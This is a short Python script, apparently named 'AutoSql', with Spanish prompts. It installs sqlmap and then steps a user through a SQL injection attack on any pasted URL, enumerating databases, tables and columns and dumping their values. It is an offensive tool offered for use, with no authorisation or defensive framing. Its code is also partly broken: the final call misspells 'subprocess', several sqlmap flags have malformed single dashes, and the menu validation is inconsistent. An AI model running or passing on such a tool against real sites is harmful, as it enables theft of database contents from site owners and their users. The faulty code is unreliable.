from pyfiglet import Figlet
import subprocess
custom_fig = Figlet(font='big')
print(custom_fig.renderText('AutoSql')), 

print('byTheRedPch')
print('https://github.com/theRedpch')
print("")
print("")
print('------------------------------------')
print('[1]', 'Instalar sqlmap')
print('[2]', 'Lanzar herramienta')
opciones = [1,2]
print('------------------------------------')

select = int(input('Escriba la opcion que desea utilizar: '))

if select == 1:
	subprocess.run(['sudo', 'apt-get', 'update'])
	subprocess.run(['sudo', 'apt-get', 'install', 'sqlmap'])
	
if select >3:
	print('Opcion no valida')
	
if select ==2:

	print('')
	print('')

	web = input("Pegue aqui la pagina web que desea realizar el ataque sql: ")

	subprocess.run(['sqlmap', '-u', web, '-dbs'])

	base = input("Pegue aqui la base de datos que desa atacar: ")

	subprocess.run(['sqlmap', '-u', web, '-random-agent', '-level', '5', '-D', base, '--tables'])

	columna = input('Inserte aqui la columna que desa atacar: ')

	subprocess.run(['sqlmap', '-u', web, '-random-agent', '-level', '5', '-D', base, '-D', base, '-T', columna, '-columns' ])

	valor = input("Pegue aqui la columa que desea ver el valor: ")

	subprocess.run(['sqlmap', '-u', web, '-random-agent', '-D', base,'-T', columna, '-C', valor, '-dump' ])

	valor_valor = input("Pegue aqui la columa que desea ver el valor: ")

	ubprocess.run(['sqlmap', '-u', web,'-D', base,'-T', columna, '-C', valor_valor, '-dump' ])



